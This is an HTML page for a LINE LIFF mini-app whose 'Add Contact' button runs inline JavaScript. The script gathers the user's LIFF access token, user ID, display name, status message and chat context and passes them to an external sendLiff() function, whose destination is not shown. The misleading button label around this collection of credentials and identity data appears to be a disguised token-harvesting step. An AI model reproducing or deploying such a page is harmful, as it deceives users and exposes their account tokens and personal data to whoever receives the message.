<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>ねずみ</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <img src="liff-starter.js" alt="usericon" id="user-icon" class="user-icon">
    <h2 class="user-name">ねずみ</h2>
  <script src="script.js"></script>
  <script>
    document.getElementById('sendBtn').addEventListener('click', async () => {
      try {
        const profile = await liff.getProfile();
        const { displayName, userId, statusMessage } = profile;
        const message = `言語設定：${liff.getLanguage()}\nLIFF SDKのバージョン：${liff.getVersion()}\nLINE内ブラウザで動作させているか：${liff.isInClient()}\nログインしているか：${liff.isLoggedIn()}\nOS：${liff.getOS()}\nアクセストークン：${liff.getAccessToken()}\n画面（1対1のチャット、グループ、またはトークルーム）を一意に識別する値：${JSON.stringify(liff.getContext())}\nユーザー名等：ユーザー名：${displayName}\nユーザーID：${userId}\nステータスメッセージ：${statusMessage}`;
        sendLiff(message);
      } catch (err) {
        console.error('Error:', err);
      }
    });
  </script>
    <button id="sendBtn" class="button">Add Contact</button>
    <p class="footer">&copy; <a href="https://github.com/nezumi0627">2024 Nezumi Project</a></p>
  </div>
  <script src="https://static.line-scdn.net/liff/edge/versions/2.22.1/sdk.js"></script>
  <script src="script.js"></script>
</body>
</html>
